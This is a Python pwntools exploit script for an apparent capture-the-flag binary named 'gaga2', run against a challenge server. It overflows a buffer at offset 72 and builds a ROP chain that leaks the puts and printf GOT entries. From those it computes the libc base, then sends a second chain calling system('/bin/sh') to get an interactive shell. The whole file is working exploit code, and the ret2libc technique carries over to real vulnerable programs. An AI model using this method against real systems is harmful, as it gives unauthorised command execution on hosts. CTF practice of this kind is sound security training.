#!/usr/bin/env python3

from pwn import *

elf = ELF("./gaga2_patched")
libc = ELF("./libc6_2.32-0ubuntu2_amd64.so")
ld = ELF("./ld-linux-x86-64.so.2")

context.update(binary=elf, encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("challs.actf.co", 31302)
    else:
        return process([elf.path])


def main():
    io = start()
    rop = ROP(elf)
    rop.puts(elf.got.puts)
    rop.puts(elf.got.printf)
    rop.main()
    io.clean(1)
    io.fit({
        72: rop.chain()
        })

    io.sendline("AA")
    puts_leak = u64(io.recvline(1).strip().ljust(8, b"\x00"))
    printf_leak = u64(io.recvline(1).strip().ljust(8, b"\x00"))
    libc.address = puts_leak - libc.sym.puts
    io.clean(1)
    success(f"Leaked Puts: {hex(puts_leak)}")
    success(f"Leaked : {hex(printf_leak)}")
    rop = ROP(libc)
    rop.system(next(libc.search(b"/bin/sh\0")))
    io.fit({
        72: rop.chain()
            })
    io.interactive()


if __name__ == "__main__":
    main()
